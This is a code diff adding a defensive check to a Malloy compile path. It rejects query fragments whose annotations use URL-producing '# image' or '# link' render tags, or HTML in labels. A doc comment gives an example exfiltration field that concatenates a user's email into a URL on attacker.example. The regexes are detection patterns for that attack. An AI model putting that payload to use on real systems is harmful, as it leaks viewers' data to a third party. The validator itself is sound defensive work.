@@ -62,6 +62,87 @@ function restrictedRejections(problems: readonly LogMessage[]): LogMessage[] {
 }
 
 /**
+ * Render tags that turn a cell value into a URL or markup the viewer's browser
+ * acts on: `# image` draws `<img src=value>` and `# link` an `<a href>`, with no
+ * scheme or host check, so a field the caller defines as
+ * `# image pic is concat('https://attacker.example/p?d=', email)` sends the
+ * value the viewer may read to a host of the caller's choosing. A model's own
+ * fields keep them (the modeler is trusted); a fragment may not write them.
+ * `@malloydata/render` reads no other tag as a URL.
+ *
+ * This is a text scan, unlike the compiler-decided constructs above, because
+ * Malloy does not classify annotations: it passes them through verbatim. The
+ * scan reads annotations the way the lexer finds them (outside strings and
+ * comments, to the end of the line) and runs before anything compiles, so the
+ * answer is the same whether or not the data behind the query exists.
+ */
+const URL_RENDER_TAG = /(?:^|[\s{},.[])(image|link)(?![\w])/;
+const HTML_IN_LABEL =
+   /\blabel\s*=\s*(?:"[^"]*<\s*[A-Za-z!/][^"]*"|'[^']*<\s*[A-Za-z!/][^']*')/;
+
+/** The text of every `#` annotation in `source`, found outside strings, comments and `##|` blocks. */
+function annotationTexts(source: string): string[] {
+   const found: string[] = [];
+   const end = source.length;
+   const lineEnd = (from: number) => {
+      const at = source.indexOf("\n", from);
+      return at === -1 ? end : at;
+   };
+   let i = 0;
+   while (i < end) {
+      const c = source[i];
+      const next = source[i + 1];
+      if (c === "'" || c === '"' || c === "`") {
+         i++;
+         while (i < end && source[i] !== c) i += source[i] === "\\" ? 2 : 1;
+         i++;
+      } else if ((c === "/" && next === "/") || (c === "-" && next === "-")) {
+         i = lineEnd(i);
+      } else if (c === "/" && next === "*") {
+         const close = source.indexOf("*/", i + 2);
+         i = close === -1 ? end : close + 2;
+      } else if (c === "#") {
+         const stop = lineEnd(i);
+         if (source.startsWith("##|", i)) {
+            // A block's prose is free text, apostrophes included, up to its closer.
+            const close = source.indexOf("|##", i + 3);
+            i = close === -1 ? end : close + 3;
+            continue;
+         }
+         found.push(source.slice(i, stop));
+         i = stop;
+      } else {
+         i++;
+      }
+   }
+   return found;
+}
+
+/** The refusal for a fragment that writes a render tag turning a value into a URL or markup, if it does. */
+function renderTagRefusal(source: string): string | undefined {
+   for (const text of annotationTexts(source)) {
+      // A routed note (`#(authorize)`, `#"`) is not a render tag.
+      if (/^#+[("]/.test(text)) continue;
+      const bare = text.replace(/"(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*'/g, '""');
+      const tag = URL_RENDER_TAG.exec(bare)?.[1];
+      if (tag) {
+         return (
+            `the submitted text writes the render tag \`# ${tag}\`, which turns a value into a ` +
+            `URL the viewer's browser would load. Fix: define the field in the model file ` +
+            `itself, where a modeler owns what it links to.`
+         );
+      }
+      if (HTML_IN_LABEL.test(text)) {
+         return (
+            `the submitted text writes HTML in a \`# label\`, which the renderer draws as markup. ` +
+            `Fix: use plain text, or define the label in the model file itself.`
+         );
+      }
+   }
+   return undefined;
+}
+
+/**
  * Compile `source` against `model` in restricted mode and throw if it uses a
  * construct that reaches outside the model's curated surface.
  *
@@ -105,6 +186,13 @@ export async function assertNoRestrictedConstructs(
    model: Model,
    source: string,
 ): Promise<void> {
+   const refusal = renderTagRefusal(source);
+   if (refusal) {
+      throw new CompileRefusedError(
+         `This Malloy cannot be compiled at scope "append", which validates a ` +
+            `fragment against the model's published surface: ${refusal}`,
+      );
+   }
    let problems: readonly LogMessage[];
    try {
       const compiled = await Malloy.compile({
